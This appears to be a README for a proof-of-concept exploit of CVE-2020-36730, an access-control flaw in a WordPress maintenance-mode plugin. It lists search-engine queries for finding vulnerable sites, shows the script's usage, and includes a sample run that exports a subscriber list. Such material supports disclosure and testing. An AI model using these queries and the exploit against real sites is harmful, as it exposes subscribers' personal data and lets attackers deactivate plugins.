# CVE-2020-36730
CMP - Coming Soon &amp; Maintenance &lt; 3.8.2 - Improper Access Controls on AJAX Calls (Subscriber+)


# Description:
Some of the AJAX calls from the plugin do not properly check for capabilities and CSRF tokens, leading to issues such as arbitrary post read, subscribers list export and plugin deactivation.


```
reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/f1ef067b-e4b4-4174-b6ff-ec94a7afd55d?source=api-prod
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cve-id: CVE-2020-36730
  metadata:
    fofa-query: "wp-content/plugins/cmp-coming-soon-maintenance/"
    google-query: inurl:"/wp-content/plugins/cmp-coming-soon-maintenance/"
    shodan-query: 'vuln:CVE-2020-36730'
```


How to use
---

```
usage: CVE-2020-36730.py [-h] -u URL [-un USERNAME] [-p PASSWORD]

CMP - Coming Soon & Maintenance < 3.8.2 - Improper Access Controls on AJAX Calls (Subscriber+) Description: Some of the AJAX calls from the plugin do not properly check for capabilities and CSRF tokens, leading to issues such as arbitrary post read, subscribers list export and plugin deactivation. CVE-2020-36730

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Website URL
  -un USERNAME, --username USERNAME
                        WordPress username
  -p PASSWORD, --password PASSWORD
                        WordPress password
```


POC
---
```
$ python3 CVE-2020-36730.py -u http://wordpress.lan -un user -p useruser1
The plugin version is below 3.8.2.
The plugin version is 3.7.6
Vulnerability check: http://wordpress.lan
Logged in successfully.



ID,Date,Email,Firstname,Lastname,Fullname
0,"2024-02-23 15:08:15",test@test.com,,,
```


